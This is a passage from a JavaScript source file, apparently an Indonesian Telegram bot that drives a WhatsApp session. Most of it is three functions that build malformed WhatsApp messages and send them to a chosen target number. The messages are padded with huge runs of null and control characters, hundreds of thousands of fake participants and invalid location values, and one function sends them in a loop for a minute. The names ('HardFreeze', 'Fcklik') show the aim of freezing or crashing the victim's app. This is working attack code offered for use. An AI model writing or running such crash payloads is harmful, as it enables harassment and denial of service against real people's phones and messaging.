<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////END/////////////////////////

///////////////////[FUNC]////////////////
async function delayspam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function DelayBuldoHardFreezeByMia(sock, target) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function NoctraFcklik(target) {
     const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "Celyn" + "ោ៝".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "CELYN",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -929.03499999999999,
                                degreesLongitude: 992.999999999999,
                                name: "",
                                address: "ោ៝".repeat(1000),
                            },
                        },
                        body: {
                            text: "HELLO".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();